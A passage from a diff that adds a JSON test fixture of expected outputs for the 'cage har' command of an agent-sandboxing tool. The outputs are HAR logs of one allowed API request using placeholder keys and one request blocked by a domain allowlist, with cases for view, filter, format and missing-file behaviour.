@@ -1,0 +1,428 @@
+{
+  "generator": "scripts/gen-cage-har-fixture.py",
+  "state_fixture": "tests/fixtures/state-compat/0.40.1",
+  "version": "0.40.2",
+  "cases": [
+    {
+      "name": "inbound-default",
+      "why": "The default view and the default everything else.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "outbound-view",
+      "why": "The other perspective, and the stderr warning that guards it.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--view",
+        "outbound"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"TEST-NOT-A-REAL-SECRET-0001\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"outbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"outbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": "WARNING: --view outbound includes real secrets (API keys, tokens). Treat the output as sensitive.\n"
+    },
+    {
+      "name": "apple-container-root",
+      "why": "An apple-container cage reads ~/.config/agentcage/apple-container/<name>/logs/, not the data root.",
+      "argv": [
+        "cage",
+        "har",
+        "mac-agent"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "apple-container-root-missing",
+      "why": "The path named in the error is the apple root, not the data root.",
+      "argv": [
+        "cage",
+        "har",
+        "mac-agent"
+      ],
+      "setup": [
+        {
+          "op": "remove",
+          "path": ".config/agentcage/apple-container/mac-agent/logs/capture.jsonl"
+        }
+      ],
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "error: no capture file found for cage 'mac-agent'\n  Expected: {HOME}/.config/agentcage/apple-container/mac-agent/logs/capture.jsonl\n\n  Add this to your cage.yaml and run `agentcage cage update`:\n    capture:\n      enable_har: true\n"
+    },
+    {
+      "name": "json-lines",
+      "why": "`json.dumps(entry)` per line \u2014 separators and all.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json-lines"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n",
+      "stderr": ""
+    },
+    {
+      "name": "json-compat-alias",
+      "why": "The hidden `--json` spelling must reach the same code.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--json"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n",
+      "stderr": ""
+    },
+    {
+      "name": "json-lines-outbound-no-warning",
+      "why": "The secrets warning is suppressed for --json-lines. It should not be.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--view",
+        "outbound",
+        "--json-lines"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"host\": \"api.anthropic.com\", \"method\": \"POST\", \"path\": \"/v1/messages\", \"inspectors\": [], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://api.anthropic.com/v1/messages\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"api.anthropic.com\"], [\"content-type\", \"application/json\"], [\"x-api-key\", \"TEST-NOT-A-REAL-SECRET-0001\"]], \"body\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\", \"bodyEncoding\": null, \"bodySize\": 34}, \"response\": {\"status\": 200, \"statusText\": \"OK\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"content-type\", \"application/json\"]], \"body\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\", \"bodyEncoding\": null, \"bodySize\": 37, \"mimeType\": \"application/json\"}}}\n{\"ts\": \"2026-03-14T15:09:26+00:00\", \"flow_id\": \"fixture-flow-0002\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"host\": \"telemetry.example.com\", \"method\": \"POST\", \"path\": \"/v1/events\", \"inspectors\": [{\"name\": \"domain\", \"action\": \"block\", \"reason\": \"domain not in allowlist\", \"severity\": \"high\"}], \"inbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}, \"outbound\": {\"request\": {\"method\": \"POST\", \"url\": \"https://telemetry.example.com/v1/events\", \"httpVersion\": \"HTTP/1.1\", \"headers\": [[\"host\", \"telemetry.example.com\"], [\"content-type\", \"application/json\"]], \"body\": \"{\\\"event\\\":\\\"fixture\\\"}\", \"bodyEncoding\": null, \"bodySize\": 19}, \"response\": {}}}\n",
+      "stderr": "WARNING: --view outbound includes real secrets (API keys, tokens). Treat the output as sensitive.\n"
+    },
+    {
+      "name": "filter-decision-blocked",
+      "why": "-d blocked keeps one of the two.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "-d",
+        "blocked"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "filter-host-substring",
+      "why": "--host is a substring match, not an equality test.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--host",
+        "telemetry"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "filter-method-lowercase",
+      "why": "--method is case-insensitive.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--method",
+        "post"
+      ],
+      "setup": [],
+      "exit_code": 0,
+      "stdout": "{\n  \"log\": {\n    \"version\": \"1.2\",\n    \"creator\": {\n      \"name\": \"agentcage\",\n      \"version\": \"{VERSION}\"\n    },\n    \"entries\": [\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://api.anthropic.com/v1/messages\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"api.anthropic.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            },\n            {\n              \"name\": \"x-api-key\",\n              \"value\": \"agentcage:secret:ANTHROPIC_API_KEY:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 34,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"model\\\":\\\"claude\\\",\\\"max_tokens\\\":16}\"\n          }\n        },\n        \"response\": {\n          \"status\": 200,\n          \"statusText\": \"OK\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"content\": {\n            \"size\": 37,\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"id\\\":\\\"msg_fixture\\\",\\\"type\\\":\\\"message\\\"}\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": 37\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0001\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"allowed\\\", \\\"inspectors\\\": [], \\\"view\\\": \\\"inbound\\\"}\"\n      },\n      {\n        \"startedDateTime\": \"2026-03-14T15:09:26+00:00\",\n        \"time\": 0,\n        \"request\": {\n          \"method\": \"POST\",\n          \"url\": \"https://telemetry.example.com/v1/events\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [\n            {\n              \"name\": \"host\",\n              \"value\": \"telemetry.example.com\"\n            },\n            {\n              \"name\": \"content-type\",\n              \"value\": \"application/json\"\n            }\n          ],\n          \"queryString\": [],\n          \"headersSize\": -1,\n          \"bodySize\": 19,\n          \"postData\": {\n            \"mimeType\": \"application/json\",\n            \"text\": \"{\\\"event\\\":\\\"fixture\\\"}\"\n          }\n        },\n        \"response\": {\n          \"status\": 0,\n          \"statusText\": \"\",\n          \"httpVersion\": \"HTTP/1.1\",\n          \"cookies\": [],\n          \"headers\": [],\n          \"content\": {\n            \"size\": 0,\n            \"mimeType\": \"\"\n          },\n          \"redirectURL\": \"\",\n          \"headersSize\": -1,\n          \"bodySize\": -1\n        },\n        \"cache\": {},\n        \"timings\": {\n          \"send\": -1,\n          \"wait\": -1,\n          \"receive\": -1\n        },\n        \"comment\": \"{\\\"flow_id\\\": \\\"fixture-flow-0002\\\", \\\"direction\\\": \\\"outbound\\\", \\\"decision\\\": \\\"blocked\\\", \\\"inspectors\\\": [{\\\"name\\\": \\\"domain\\\", \\\"action\\\": \\\"block\\\", \\\"reason\\\": \\\"domain not in allowlist\\\", \\\"severity\\\": \\\"high\\\"}], \\\"view\\\": \\\"inbound\\\"}\"\n      }\n    ]\n  }\n}\n",
+      "stderr": ""
+    },
+    {
+      "name": "filter-direction-empty",
+      "why": "A filter that matches nothing still produces a valid HAR log.",
+      "argv": [
+        "cage",
+        "har",
+        "acme-agent",
+        "--direction",
+        "inbound"
+      ],
+      "setup": [],
+      "exit_code": 0,
